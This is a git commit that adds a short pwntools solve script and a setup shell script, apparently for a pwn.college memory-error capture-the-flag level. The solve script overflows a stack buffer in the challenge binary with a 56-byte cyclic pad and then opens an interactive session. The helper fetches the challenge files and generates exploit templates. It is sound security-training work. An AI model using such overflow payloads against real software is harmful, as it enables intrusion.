a58cde71932d4fb3b8b13816ae86ea795a351891
AndersFelde <anderskfelde@hotmail.com>
2024-01-26 10:55:02 +0100

    ok

---
+++ memory_error/1.1/solve.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template ./babymem_level1.1
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or "./babymem_level1.1")
+context.delete_corefiles = True
+context.terminal = ["alacritty", "-e", "sh", "-c"]
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    """Start the exploit against the target."""
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = """
+break *challenge+274
+""".format(
+    **locals()
+)
+
+from pwnlib.commandline.main import main
+from pwnlib.commandline.template import main
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+io = start()
+io.sendline("200")
+io.sendline(fit(cyclic(56), 1))
+io.interactive()
---
+++ memory_error/start_challenge.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+if [ -z "$1" ]; then
+    echo "Error: No argument supplied"
+    exit 1
+fi
+
+mkdir -p $1
+cd $1
+scp -r pwncollege:/challenge/. ./
+
+for file in ./*; do
+    if [[ $file != *.c ]]; then
+        # Run your command on the file
+        pwn template $file > solve.py
+        auto_ghidra $file
+        break
+    fi
+done
